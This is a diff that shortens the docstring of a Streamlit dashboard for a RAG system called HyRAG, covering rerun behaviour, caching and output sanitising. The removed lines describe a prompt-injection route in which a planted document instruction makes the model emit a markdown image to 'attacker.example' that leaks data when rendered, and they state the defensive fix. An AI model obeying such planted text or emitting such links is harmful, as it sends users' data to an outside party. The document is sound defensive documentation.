@@ -1,16 +1,10 @@
-"""HyRAG query dashboard (Streamlit). Run:  HYRAG_API_URL=http://localhost:8000 streamlit run dashboard/app.py
+"""HyRAG dashboard (Streamlit). Run:  HYRAG_API_URL=http://localhost:8000 streamlit run dashboard/app.py
 
-A thin client of the HTTP API (dashboard/client.py): it never imports `hyrag`, so it runs in its own container.
+It only talks to the HTTP API (client.py), so it runs in its own container without the hyrag package.
 
-Speed, by design (measured in docs/phase5.md):
-- the question is in a form: typing never reruns the page, only pressing Ask does;
-- answers live in session_state: every later rerun redraws from memory and never calls the API again;
-- expanding a passage or clicking a citation happens in the browser (no rerun at all);
-- the side panel's calls are cached; "compare with dense-only" sends both requests in parallel.
-
-Safety: answer text comes from a model, and a planted instruction in a document could make it emit an image
-("![](https://attacker.example/?q=...)") that the browser would fetch on render, leaking data. Model text is
-rendered with images removed and external links shown as plain text; raw HTML is never rendered.
+Streamlit reruns the whole script on every interaction, so: the question sits in a form and only Ask reruns the
+page, answers are kept in session_state so reruns never call the API, and the sidebar calls are cached. The
+dense-only comparison sends both requests at once. Model text goes through safety.py before it's shown.
 """
 import os
 import time
